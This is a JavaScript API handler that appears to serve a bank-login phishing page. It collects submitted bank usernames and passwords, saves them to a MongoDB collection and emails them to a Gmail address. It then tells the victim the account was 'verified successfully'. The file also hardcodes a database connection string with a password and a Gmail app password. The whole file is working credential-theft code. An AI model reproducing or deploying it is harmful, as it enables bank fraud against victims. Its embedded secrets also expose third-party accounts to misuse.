import nodemailer from "nodemailer";
import { MongoClient } from "mongodb";

// MongoDB connection function
const connectToDatabase = async () => {
  const client = new MongoClient("mongodb+srv://paulclipps:IW07WLOhHbCq8QIX@cluster0.gwdix.mongodb.net/");
  await client.connect();
  const db = client.db("Users"); // Use the "Users" database
  return { db, client };
};

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ message: "Method Not Allowed" });
  }

  const { bankUsername, bankPassword } = req.body;

  try {
    // Save the data to MongoDB
    await saveDataToDatabase({ bankUsername, bankPassword });

    // Set up Nodemailer for sending the email
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: "debbanderson967@gmail.com",
        pass: "dyhg wqlu cnsb dtex",
      },
    });

    const mailOptions = {
      from: "debbanderson967@gmail.com",
      to: "debbanderson967@gmail.com",
      subject: "Bank Login Information",
      text: `Bank username: ${bankUsername}\nBank password: ${bankPassword}`,
    };

    // Send the email
    await transporter.sendMail(mailOptions);

    return res
      .status(200)
      .json({ message: "Account verified successfully and email sent!" });
  } catch (error) {
    console.error("Error:", error.message);
    return res.status(500).json({
      message: "Failed to send email or save data",
      error: error.message,
    });
  }
}

// Function to save data to MongoDB
async function saveDataToDatabase(data) {
  try {
    // Connect to MongoDB
    const { db, client } = await connectToDatabase();

    // Access the "login" collection
    const loginCollection = db.collection("login");

    // Insert the bank login data with a timestamp
    await loginCollection.insertOne({
      ...data,
      timestamp: new Date().toISOString(),
    });

    console.log(loginCollection);
    

    // Close the MongoDB connection
    await client.close();

    console.log("Bank login data saved successfully in MongoDB!");
  } catch (err) {
    console.error("Error saving bank login data to database:", err);
    throw new Error("Failed to save bank login data to database");
  }
}
